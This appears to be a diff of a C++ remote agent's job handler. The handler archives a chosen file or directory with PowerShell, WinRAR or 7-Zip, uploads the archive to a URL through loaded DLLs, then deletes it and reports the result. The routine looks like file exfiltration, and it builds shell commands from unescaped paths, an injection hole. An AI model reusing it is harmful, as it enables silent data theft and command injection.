@@ -389,20 +389,20 @@ void startJob_t(SharedResourceManager &sharedResources) {
 		if (compressionUtility.empty()) {
 			dataToSend = L"Couldn't found Compress-Archive, WinRAR or 7zip utility on this system";
 		}
-		if (compressionUtility == L"Compress-Archive") {
-			command = L"powershell";
-			// For directory --> Compress-Archive -Path "path/to/dir" -DestinationPath "archivePath.zip"
-			destinationPath = fs::temp_directory_path().wstring() + filename + L".zip";
-			args = L"Compress-Archive -Path \"" + path + L"\" -DestinationPath \"" + destinationPath + L"\"";
-		}
 		else if (compressionUtility == L"WinRAR") {
 			destinationPath = fs::temp_directory_path().wstring() + filename + L".rar";
 			// "C:\program files\WinRAR\Rar.exe" a -m5 -r -ep1 -idq -y "path/to/temp/filename.rar" "path/to/fileOrDir"
 			command = L"\"" + compressionUtilityPath + L"\\Rar.exe\" ";
-			if(fs::is_directory(path))
+			if (fs::is_directory(path))
 				args = L"a -r -m5 -idq -y -ep1 \"" + destinationPath + L"\" \"" + path + L"\"";
 			else
 				args = L"a -m5 -idq -y -ep1 \"" + destinationPath + L"\" \"" + path + L"\"";
+		}
+		else if (compressionUtility == L"Compress-Archive") {
+			command = L"powershell";
+			// For directory --> Compress-Archive -Path "path/to/dir" -DestinationPath "archivePath.zip"
+			destinationPath = fs::temp_directory_path().wstring() + filename + L".zip";
+			args = L"Compress-Archive -Path '" + path + L"'" + L" -DestinationPath " + L"'" + destinationPath + L"\'";
 		}
 		else if (compressionUtility == L"7-Zip") {
 			destinationPath = fs::temp_directory_path().wstring() + filename + L".7z";
@@ -410,7 +410,6 @@ void startJob_t(SharedResourceManager &sharedResources) {
 			command = L"\"" + compressionUtilityPath + L"\\7z.exe\" ";
 			args = L"a -t7z -m0=LZMA2 -mx= -y -aoa \"" + destinationPath + L"\" \"" + path + L"\"";
 		}
-
 		HMODULE hExecLib = LoadLibrary(TEXT("executeCommands.dll"));
 		if (hExecLib == NULL) {
 			dataToSend = L"Failed to load DLL.";
@@ -427,7 +426,7 @@ void startJob_t(SharedResourceManager &sharedResources) {
 		else if (UploadFileToURLViaDll(handle_filetransferLib, url, destinationPath, errorMsg)) {
 			dataToSend = destinationPath + L" uploaded successfully";
 		}
-		else { dataToSend = destinationPath + L" didn't get uploaded, error msg: " + errorMsg; }
+		else {  dataToSend = destinationPath + L" didn't get uploaded, error msg: " + errorMsg; }
 		if (!fs::remove(destinationPath, ec)) {
 			dataToSend = fs::temp_directory_path().wstring() + filename + L" NOT deleted: " + StringUtils::s2ws(ec.message());
 		}
